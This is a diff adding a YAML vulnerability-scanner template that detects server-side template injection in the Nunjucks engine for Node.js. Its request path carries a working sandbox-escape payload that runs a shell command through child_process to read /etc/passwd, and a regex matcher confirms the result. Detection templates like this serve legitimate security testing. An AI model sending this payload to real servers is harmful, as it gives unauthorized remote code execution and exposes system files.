@@ -1,0 +1,22 @@
+id: node-nunjucks-ssti
+info:
+  author: geeknik
+  description: Nunjucks is a template engine for by Jinja2 used to develop web applications
+    on Node.js web frameworks as Express or Connect.
+  name: Node Nunjucks SSTI
+  reference: https://disse.cting.org/2016/08/02/2016-08-02-sandbox-break-out-nunjucks-template-engine
+  severity: high
+  tags: node,nunjucks,ssti
+requests:
+- matchers:
+  - regex:
+    - 'root:[x*]:0:0:'
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/page?name={{range.constructor("return global.process.mainModule.require(''child_process'').execSync(''tail
+    /etc/passwd'')")()}}'
